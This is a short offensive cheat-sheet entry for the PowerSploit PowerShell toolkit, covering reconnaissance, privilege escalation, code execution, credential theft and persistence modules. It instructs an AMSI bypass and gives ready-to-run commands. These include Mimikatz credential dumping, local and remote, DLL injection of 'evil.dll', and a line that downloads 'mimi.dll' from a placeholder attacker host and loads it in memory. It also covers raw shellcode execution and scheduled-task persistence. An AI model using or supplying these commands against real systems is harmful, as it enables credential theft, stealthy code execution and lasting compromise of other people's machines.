# 03.24 PowerSploit

> PowerShell offensive toolkit suite — PowerView, PowerUp, Invoke-Mimikatz, ReflectivePEInjection, more.

## Overview

PowerSploit is the umbrella collection of offensive PowerShell modules. Sub-modules: Recon (PowerView), Privesc (PowerUp), CodeExecution (Invoke-DllInjection, Invoke-ReflectivePEInjection, Invoke-Shellcode), Exfiltration (Get-VaultCredential, Invoke-Mimikatz), Persistence, AntivirusBypass, Mayhem, ScriptModification. Heavily signatured by Defender — requires AMSI bypass to run unmodified, or use forks/individual scripts.

## Steps

- **Step 1** - Clone the dev branch.
- **Step 2** - Bypass AMSI in your PowerShell session.
- **Step 3** - Import desired module.

## Commands

### Clone

```powershell
git clone https://github.com/PowerShellMafia/PowerSploit
cd PowerSploit
```

### Dot-source individual modules

```powershell
. .\Recon\PowerView.ps1
. .\Privesc\PowerUp.ps1
. .\Exfiltration\Invoke-Mimikatz.ps1
. .\CodeExecution\Invoke-DllInjection.ps1
. .\CodeExecution\Invoke-ReflectivePEInjection.ps1
. .\Persistence\Persistence.ps1
```

### Invoke-Mimikatz remote

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
Invoke-Mimikatz -DumpCreds -ComputerName <TARGET>     # uses PSRemoting to dump remotely
```

### Invoke-DllInjection

```powershell
Invoke-DllInjection -ProcessID <PID> -Dll C:\evil.dll
```

### Invoke-ReflectivePEInjection (load PE in memory)

```powershell
$Bytes = (New-Object Net.WebClient).DownloadData('http://<ATTACKER>/mimi.dll')
Invoke-ReflectivePEInjection -PEBytes $Bytes
```

### Invoke-Shellcode (run raw shellcode)

```powershell
.\Invoke-Shellcode.ps1
Invoke-Shellcode -Shellcode (msfvenom output as bytes)
```

### Persistence: scheduled task

```powershell
$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
$UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle
Add-Persistence -FilePath payload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions
```
